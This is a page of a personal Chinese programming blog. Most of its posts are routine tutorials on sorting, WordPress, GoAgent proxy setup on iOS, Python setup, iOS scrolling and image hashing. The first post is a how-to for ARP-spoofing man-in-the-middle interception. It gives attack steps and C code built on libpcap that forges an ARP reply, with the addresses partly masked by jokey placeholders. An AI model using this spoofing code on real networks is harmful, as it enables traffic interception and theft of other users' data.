
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>snorlax's Homepage</title>
    
    <meta name="author" content="Xinzheng Zhang">

    <!-- Enable responsive viewport -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le styles -->
    <link href="/assets/themes/twitter/bootstrap/css/bootstrap.2.2.2.min.css" rel="stylesheet">
    <link href="/assets/themes/twitter/css/style.css?body=1" rel="stylesheet" type="text/css" media="all">
    <link href="/assets/themes/twitter/css/pygments.css?body=1" rel="stylesheet" type="text/css" media="all">
    <!-- Le fav and touch icons -->
  <!-- Update these with your own images
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
  -->

    <!-- atom & rss feed -->
    <link href="" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

  </head>

  <body>
    <div class="navbar">
      <div class="navbar-inner">
        <div class="container-narrow">
          <a class="brand" href="/">Snorlax's blog</a>
          <ul class="nav">
            
            
            


  
    
      
      	
      	<li><a href="/about.html">About me</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="/archive.html">Archives</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  




          </ul>
        </div>
      </div>
    </div>
    <div class="container_wrapper">
      <div class="container-narrow">
        <div class="content">
          <!-- <ul class="listing"> -->

<div class="page-header">
  <h3><a href="/program/2013/03/20/arp%E6%AC%BA%E9%AA%97%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81arp%E5%8C%85%E8%A7%A3%E6%9E%90">arp欺骗中间人攻击的实现、arp包解析 </a></h3>
  <div class="date">
    <span>20 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>首先先是了解下什么arp欺骗 可以参加这篇文章http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml<br />
看完这篇文章我们就可以实施攻击<br />
1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br />
2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br />
3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br />
4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack's mac gateway就可以了<br />
------------------ARP表的设置基本完成----------------------------------------------------------------------------<br />
接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br />
然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br />
------------------上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?------------<br />
接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299" /></a>
然后我从真实抓下来的arp进行分析<br />
首先arp广播包是 42个字节<br />
arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br />
然后我贴代码对这42个字节进行具体分析<br />
因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br />
不过我发现给在数据连路层上的更好的一组东西:)<br />
神器不解释啊= =<br />
详见<br />
http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>

<p><p>
```</p>

<h1>include</h1>

<h1>include</h1>

<h1>include</h1>

<p>int main(int argc, char **argv) {
    pcap_t *fp;
    char error[PCAP_ERRBUF_SIZE];
    u_char packet[60];
    int i;</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">/* Check the validity of the command line */
if (argc != 2)
{
    printf(&quot;usage: %s inerface&quot;, argv[0]);
    return -1;
}

/* Open the output adapter */
if((fp = pcap_open_live(&quot;en0&quot;, 100, 1, 1000, error) ) == NULL)
{
    fprintf(stderr,&quot;\nError opening adapter: %s\n&quot;, error);
    return -1;
}

/* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
/*被攻击者的mac*/
packet[0]=xx;
packet[1]=32;
packet[2]=102;
packet[3]=8;
packet[4]=jiubu;
packet[5]=gaosuni;

/* set mac source to 2:2:2:2:2:2 */
/*攻击者的mac*/
packet[6]=jiu;
packet[7]=bu;
packet[8]=gaosu;
packet[9]=234;
packet[10]=xx;
packet[11]=100;
/*arp*/
packet[12]=8;
packet[13]=6;
/*arp首部*/
packet[14]=0;
packet[15]=1;

packet[16]=8;
packet[17]=0;

packet[18]=6;
packet[19]=4;
packet[20]=0;
packet[21]=2;
/*被骗的那个人的arp表上的假mac*/
packet[22]=jiu;
packet[23]=154;
packet[24]=32;
packet[25]=bu;
packet[26]=253;
packet[27]=gao;
/*被骗者的网关*/
packet[28]=192;
packet[29]=168;
packet[30]=1;
packet[31]=1;
/*被攻击者的mac*/
packet[32]=xx;
packet[33]=32;
packet[34]=102;
packet[35]=xx;
packet[36]=xx;
packet[37]=184;
/*被攻击者的ip*/
packet[38]=192;
packet[39]=168;
packet[40]=1;
packet[41]=114;

/* Fill the rest of the packet */
/*乱填就好了*/
for(i=42;i
    packet[i]=i%256;
}

/* Send down the packet */
pcap_sendpacket(fp,
                packet,
                60);

return 0;
</code></pre></div>
<p>}</p>

<p>以上arp欺骗的完整实现、不要用来干坏事= =</p>

<blockquote>
</blockquote>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/03/15/sae-%E6%99%AE%E9%80%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E6%8E%A8%E8%8D%90%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A83-15-%E8%A7%A3">sae 普通开发者免推荐认证活动3.15 解 </a></h3>
  <div class="date">
    <span>15 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><a href="http://cloudbbs.org/forum.php?mod=viewthread&amp;tid=12876">大家好我是传送门</a></p>

<p>活动如上<br />
主要题干是<br />
请将昨天的100位数字，使用你熟悉的编程语言，首先将其由字符串转换为长度为100的整数数组；其次，对数组进行排序，实现奇数在左边，偶数在右边，并且分别有序，希望最多只使用O(1)的空间复杂度（如能不借助额外空间实现排序，首位完成者将有惊喜~）。</p>

<p>数字如下：31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823</p>

<p>其实难度也不大、主要就是想出了一个非常巧妙的方法解决<br />
首先没有时间复杂度要求 但对空间要求零空间 脑子第一反应就是快排 但是最大的问题就是如何再零空间下把奇偶分开然后分别快排即可<br />
就是两个游标的交互替换、写出来就是感觉非常巧妙啦:)</p>

<p>代码如下</p>

<p><p>
```</p>

<p>i=-1
j=0
pi = &quot;31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823&quot;
l = [int(tt) for tt in pi[:100]]
while j</p>

<p>print sorted(l[0:i+1])+sorted(l[i+1:100])</p>

<p>经过评论大哥的指点python的实现</p>

<p>pi = &quot;31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823&quot;
l=[int(tt) for tt in pi[:100]]
l.sort(lambda x,y:(x-y)if(x%2-y%2==0)else(y%2-x%2))
print l</p>

<blockquote>
</blockquote>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/03/09/%E5%85%B3%E4%BA%8Ewordpress-%E5%90%8C%E6%AD%A5twitter%E5%8A%A0%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%9C%8D%E5%8A%A1">关于wordpress 同步twitter加短地址服务 </a></h3>
  <div class="date">
    <span>09 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>1.首先安装依赖http://wordpress.org/extend/plugins/social/<br />
2.再安装上 https://wordpress.org/extend/plugins/twitter-tools/</p>

<p>这样就其实已经可以在发布的时候同步到twitter上了、但是有一个问题那就是url是全长度输出的、在限制长度的twitter下这是个非常大的问题<br />
所以我修改了下源码用了sina的短地址服务（大sina把google api给墙掉了残年……<br />
-----------------------------------------------------------------------------------------------------------<br />
具体操作如下<br />
1.首先从wordpress的根目录开始寻址到/wp-content/plugins/social/views/wp-admin/post/broadcast/options.php （我们需要修改文件就在这<br />
2.找到第70行 其实我们从这里就可以看出$account['content']里就是我们发出的文本段（鉴于本人太懒不高兴往上找了所以就直接在这段做处理<br />
3.先用正则式剔出我们blog的url 然后对他进行shorten再替换回去

```

url_short,$account['content']);
    echo esc_textarea($tar);
    echo ";
    echo esc_textarea($tar);
?>>
</p></pre></p>

<p>然后跑起来就ok了<br />
修改完后的文件附上:<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/options.php_.zip">options.php</a></p>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/03/07/%E5%85%B3%E4%BA%8Eios%E4%B8%8B%E7%9A%84goagent%E4%BD%BF%E7%94%A8">关于ios下的goagent使用 </a></h3>
  <div class="date">
    <span>07 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>国际惯例先问候下方滨兴你这狗娘养的<br />
-----------------------------------------------------------------------------------<br />
首先说下我的server的版本是2.1.3<br />
ios下的goagent各种教程到处都是、可是只可惜共军太狡猾、gfw现在是越来越牛逼<br />
反正我搜着的各种帖子要么是那种二到家的就装装装下去就成功了、要么就是中间某个步骤被干掉了<br /></p>

<p>正常人都肯定会看官方的文档、可惜没那么简单……<del datetime="2013-03-07T06:08:41+00:00"><a href="https://code.google.com/p/goagent/wiki/GoAgent_IOS">https://code.google.com/p/goagent/wiki/GoAgent_IOS</a></del>
这上面的版本由于过于古老让我吃尽苦头<br />
好了废话到此位置<br />
-----------------------------------------------------------------------------------<br />
由于官方那个是把python包直接内嵌在里面的所以第一步装python<br />
为了一下操作方便点可以安装下open ssh以及aptbackup(用了这个就可以直接用apt-get了<br />
1.这个可以直接在178的源里搜索安装python2.7<br />
2.在big boss源中安装adv-cmds（是下一步的依赖<br />
3.接下去就是goagent了 <a href="https://code.google.com/p/goagent/downloads/detail?name=goagent-local-1.7.deb&amp;can=2&amp;q=">https://code.google.com/p/goagent/downloads/detail?name=goagent-local-1.7.deb&amp;can=2&amp;q=</a>(debian包安装可以采取dpkg -i 或者就索性丢到</var/root/Media/Cydia/AutoInstall> 重启下<br />
4.安装方便的工具栏 有两种选择 第一是先装sbsetting依赖（有一串东西）然后装178源里的goagent-toggle 第二就是用之前的goagent-ios 在里面的/Applications/goagent-ios.app/goagent-local/proxy.py做一个映射到/var/mobile/goagent-local/proxy.py（前者是在sbsetting中进行开关、后者是在通知栏最下放有个按键进行开关）<br />
5.配置goagent中的appid、以及更改为google_hk(若用google_cn请把hosts中的域名更改为响应的ip地址、isp不提供解析)配置当前网络下的pac 地址在<a href="file://localhost/stash/Applications/MobileSafari.app/8087.pac">file://localhost/stash/Applications/MobileSafari.app/8087.pac</a> 在当前wifi里的http proxy中填写<br />
以上你已经在http情况下翻过去了<br />
6.现在要安装ca、这个正常看起来简单暴的事情、由于你现在根本在没翻的前提下变的异常困难不过你可以发现goagent-local里其实已经有了很多ca了、把</var/mobile/goagent-local/certs/apis.google.com.crt> 拷贝出来（如果本机可以翻墙可以直接把<a href="https://goagent.googlecode.com/files/CA.crt">https://goagent.googlecode.com/files/CA.crt</a>下载下来用并跳到8） 然后如果自己有python环境就用传说中两行的web服务器把ca给共享出去</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">import SimpleHTTPServer
SimpleHTTPServer.test()

7.在safari访问这个然后下一步安装、到这就可以轻易的safari访问 &lt;https://goagent.googlecode.com/files/CA.crt&gt; 装他的ca了

8.你自由了:-)

ps.以上的server的环境是在2.1.3的基础上server我放了个压缩包server
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/01/29/%E5%85%B3%E4%BA%8Ewindows%E9%87%8C%E7%9A%84python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">关于windows里的python环境配置 </a></h3>
  <div class="date">
    <span>29 January 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>首先windows下面没有类似bpython、ipython等神器……<br />
很小很小的东西当然可以用sublime text2但是稍微复杂点的没有一个好点的ide还是不行的<br />
先是推荐一个不错的ide是jetbrains做的pycharm、根据这牌子名可想而知肯定是不错的啦、但可惜人家是收费的（当盗版狗是不好的行为……<br />
然后选择了eclipse+pydev、试用了下效果还是非常不错的（应该是新电脑跑eclispe非常流畅的缘故了啦（¯﹃¯）<br />
个么要装分别就是<br />
1.Java http://www.java.com/zh_CN/download/index.jsp<br />
2.Jdk http://www.oracle.com/technetwork/java/javase/downloads/index.html<br />
3.eclipse http://www.eclipse.org/downloads/<br />
4.pvDev http://pydev.org/manual_101_install.html (其中尤其要关注一下 Then, UNCHECK the 'Contact all update sites during install to find required software' and press<br />
'Next' again to confirm your selection. 把那个钩子要去掉的因为这个失败了好多次<br />
5.python http://python.org/download/<br />
分别全装完之后还剩下最后就是要在eclipse里设置python解释器的路径了<br />
6.windows->perferences->PyDev->Interpereter-Python 设置5中python的路径</p>

<p>enjoy</p>

<p>ps.切记1 2 3步的要么全是32位要么全是64 因为64位机能够很成功自然得装上32位的Java然后再eclipse里会加载jvm.dll是出错……详见http://stackoverflow.com/questions/7352493/failed-to-load-the-jni-shared-library-jdk</p>

<p></p>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/01/21/%E5%85%B3%E4%BA%8E%E5%A4%84%E7%90%86%E6%8E%89urllib2%E4%B8%AD%E7%9A%84%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E5%BC%82%E5%B8%B8">关于处理掉urllib2中的错误提示异常 </a></h3>
  <div class="date">
    <span>21 January 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>在很多情况下如果server帮着redirect一下什么的、如果还使用urllib2的urlopen非常容易抛出异常、而且既然人家给你跳转了你照着搬不就完了么混蛋……<br />
然后下面讲下怎么除掉掉这些异常其实很简单<br />
再构建的时候对urllib2.HTTPCookieProcessor进行复写、把里面的异常的地方给复写掉<br />
代码如下</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">class NoExceptionCookieProcesser(urllib2.HTTPCookieProcessor):
    def http_error_500(self, req, fp, code, msg, hdrs):
        return fp

以此类推想弄掉哪儿些复写掉即可
然后构造的时候

cookie = cookielib.CookieJar()
opener = urllib2.build_opener(NoExceptionCookieProcesser(cookie))

行了、这样讨厌的异常就搞定了
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/01/07/%E5%85%B3%E4%BA%8E%E5%B5%8C%E5%A5%97%E4%B8%8Euiscrollview%E4%B8%AD%E7%9A%84uitableview%E7%9A%84%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3">关于嵌套与UIScrollView中的UITableVIew的冲突解决 </a></h3>
  <div class="date">
    <span>07 January 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>周知tableview是继承自scrollview的、一旦如果在scrollview上add上子的table那么双方的滚动就冲突了、只能选择其一、apple的文档里也讲了两者是冲突的不要加子table到scroll上、但是发现其实还是有解决方法的<br />
首先的关键点就是禁掉两方的任意一个ScrollEnabled另一方就可以滚动了、所以就从这下手其实思路也非常简单、就是给table加一个gesture、捕捉提前捕捉事件然后禁掉背的scroll的滚动话不多讲上代码</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    scr=[[UIScrollView alloc]initWithFrame:CGRectMake(0, 0, 320, 440)];
    scr.delegate=self;
    [scr setContentSize:CGSizeMake(320, 800)];
    [scr setDelaysContentTouches:YES];//记得这里要把延迟触摸设成yes
    UIView *pand=[[UIView alloc]initWithFrame:CGRectMake(0, 0, 320, 800)];
    [pand setBackgroundColor:[UIColor redColor]];
    tableView=[[UITableView alloc]initWithFrame:CGRectMake(0, 0, 320, 440)];
    tableView.dataSource=self;
    tableView.delegate=self;
    UILongPressGestureRecognizer *ge=[[UILongPressGestureRecognizer alloc]initWithTarget:self action:@selector(cancelScroll:)];
    [ge setDelegate:self];
    [ge setMinimumPressDuration:0.1];//这里为了让他在tableview还是能够进行整个scroll的拖动所以用了0.1给用户一个快速拖动
    [tableView addGestureRecognizer:ge];
    [self.view addSubview:scr];
    [scr addSubview:pand];
    [scr addSubview:tableView];
}

然后是回调

-(BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer
{
    //切记这个代理必须要设置、因为scroll的拖动说白了也是一个gesture、为了流畅性必须要两个触碰事件同时触发
    return YES;
}
-(void)cancelScroll:(UIGestureRecognizer*)gesture
{
    //这里就是让背景的拖动定死这样就不冲突了
    if ([gesture state]==UIGestureRecognizerStateBegan) {
        [scr setScrollEnabled:NO];
    }

}
-(void)scrollViewDidEndDragging:(UIScrollView *)scrollView willDecelerate:(BOOL)decelerate
{
    //拖动完再恢复
    [scr setScrollEnabled:YES];
}

&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/gossip/2013/01/01/rc4-python%E5%AE%9E%E7%8E%B0">rc4 python实现 </a></h3>
  <div class="date">
    <span>01 January 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>复习密码无事写了个rc4、早上随便说点新年愿望其实也有个就写里面了……</p>

<p>闲得蛋疼得就解了吧（不过tm简单过份了吧喂！</p>

<p><a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/01/734420E9-D793-4822-9B07-01A783B74818.jpg"><img class="alignnone size-full wp-image-174" title="734420E9-D793-4822-9B07-01A783B74818" src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/01/734420E9-D793-4822-9B07-01A783B74818.jpg" alt="" width="523" height="551" /></a></p>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#gossip-ref">
    		gossip <span>5</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2012/12/23/os-x-%E7%9A%84%E5%90%AF%E5%8A%A8%E9%A1%B9">os x 的启动项 </a></h3>
  <div class="date">
    <span>23 December 2012</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>每次开机总要开几个脚本开烦了、然后研究了下自己机器的几个开机自启的程序的写法总结了下</p>

<p>首先是这个目录 然后我分别展开了/Library/StartupItems 以及集中的mysql可以看到里面就是主要一个是StartupParameters.plist 以及一个sh</p>

<p><a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/12/8460C8BA-D46E-4C02-B3B6-01AF84D6F28E.jpg"><img class="alignnone size-full wp-image-167" title="8460C8BA-D46E-4C02-B3B6-01AF84D6F28E" src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/12/8460C8BA-D46E-4C02-B3B6-01AF84D6F28E.jpg" alt="" width="501" height="69" /></a></p>

<p>然后解释下里面分别怎么写</p>

<p><p>首先是 StartupParameters.plist这个xml里面的内容大致是</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
    &amp;lt;key&amp;gt;Description&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;MySQL 5.5.20-community&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;OrderPreference&amp;lt;/key&amp;gt;
    &amp;lt;string&amp;gt;None&amp;lt;/string&amp;gt;
    &amp;lt;key&amp;gt;Provides&amp;lt;/key&amp;gt;
    &amp;lt;array&amp;gt;
        &amp;lt;string&amp;gt;MySQL&amp;lt;/string&amp;gt;
    &amp;lt;/array&amp;gt;
    &amp;lt;key&amp;gt;Uses&amp;lt;/key&amp;gt;
    &amp;lt;array&amp;gt;
        &amp;lt;string&amp;gt;Network&amp;lt;/string&amp;gt;
        &amp;lt;string&amp;gt;Resolver&amp;lt;/string&amp;gt;
    &amp;lt;/array&amp;gt;
    &amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
主要有几个key description OrderPreference Provides Uses
具体是什么如下
&quot;Description&quot; is a simple description of the service, which is only used to describe the file and not during the startup process.

&quot;Provides&quot; specifies the services that this StartupItems provides. Provides can contain multiple services, but it is not recommended. Here Apache provides a &quot;Web Server&quot; service.

&quot;Requires&quot; specifies the services that have to be started before this StartupItem is loaded. The values in this field are those of other StartupItems&#39; &quot;Provides&quot; fields. Apache requires &quot;DirectoryServices&quot; to be loaded before it can be run; if DirectoryServices are not specified to run or fail to run properly Apache won&#39;t run.

&quot;Uses&quot; specifics the services that should be started before this StartupItem is loaded. This is similar to the &quot;Requires&quot; attribute except this service will always be loaded, but only after it has tried to execute all the services in &quot;Uses&quot;. Apache uses the &quot;Disks&quot;, &quot;NFS&quot;, and &quot;Network Time&quot; services. OS X will try to load these services, if it can&#39;t it will still load Apache, but only after trying these services first.

&quot;OrderPreference&quot; specifies the general time period in which a StartupItem will be executed. This order is less significant than both &quot;Requires&quot; and &quot;Uses&quot; but is used to determine order after evaluating those attributes. The possible values for this attribute are: First, Early, None (default), Late, Last. Apache specifies no OrderPreference as to when it should be loaded.

然后就是写的脚本了

简单点的写法就这样
#!/bin/sh
. /etc/rc.common

StartService ()
{
    ConsoleMessage &quot;Running script.&quot;
    python /Users/zxz/work/xxxx.py
}

StopService ()
{
    return 0
}

RestartService ()
{
    return 0
}

RunService &quot;$1&quot;
里面的shell就随意怎么写了

然后正常的 start stop restart也都可以正常用了

ps.最后记得注意要修改脚本的权限……chown root:wheel chmod 755
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2012/12/07/%E7%9B%B8%E4%BC%BC%E5%9B%BE%E7%89%87%E6%90%9C%E7%B4%A2python%E5%AE%9E%E7%8E%B0">相似图片搜索python实现 </a></h3>
  <div class="date">
    <span>07 December 2012</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>先贴原文<a href="http://blog.csdn.net/luohong722/article/details/7100058">http://blog.csdn.net/luohong722/article/details/7100058</a><br />
其实这篇文章已经写的非常详细了、不过也作为巩固自己再梳理一遍<br />
首先这个算法的流程简直简单的令人发指、导致我做的时候完全不觉得这真的可能搜索出什么东西来……<br />
几步流程分别如下<br />
1.压缩成8*8的小图<br />
2.灰化<br />
3.算均值二值化<br />
4.生成64位标示码<br />
5.比较标示码 越接近越相似<br />
貌似好像应该是sift算法的简便吧（也不能简便成这样啊……<br />
---------------------------下面是程序主要逻辑一共就十几行--------------------------<br />
主要用到了python的PIL库</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">from PIL import Image
def picHash(im):
    if not isinstance(im, Image.Image):
        im = Image.open(im)
    #平滑的压成8*8 并灰化
    im = im.resize((8, 8), Image.ANTIALIAS).convert(&#39;L&#39;)
    avg = reduce(lambda x, y: x + y, im.getdata()) / 64.0
    return map(lambda i: 0 if i &amp;lt; avg else 1, im.getdata())

def diffCount(h1,h2):
    h=0
    for i in range(64):
       if h1[i]!=h2[i]:
           h+=1
    return h
然后呢……然后没了……就是那么简单……最后发一下效果图
图片样本20张
最后搜出的近似度前5的左上为搜索原图

效果还是非常不错的、样本里只有一张未被选出
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>44</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<!-- </ul> -->

<div id="post-pagination" class="paginator">

  
    
    <a href="/page2">前页</a>
    
  

      
      <a href="/">1</a>
      

    
      
      <a href="/page2">2</a>
      
    
      
      <span class="current-page">3</span>
      
    
      
      <a href="/page4">4</a>
      
    
      
      <a href="/page5">5</a>
      
    
      
      <a href="/page6">6</a>
      
    

  
    <a class="next" href="/page4">后页</a>
  
  (共56篇)
</div>

        </div>
        <hr>
        <footer>
          <p>&copy; 2014 Xinzheng ZhangPowered by Jekyll @ GitHub
          </p>
        </footer>

      </div>
    </div>
    
  </body>
</html>

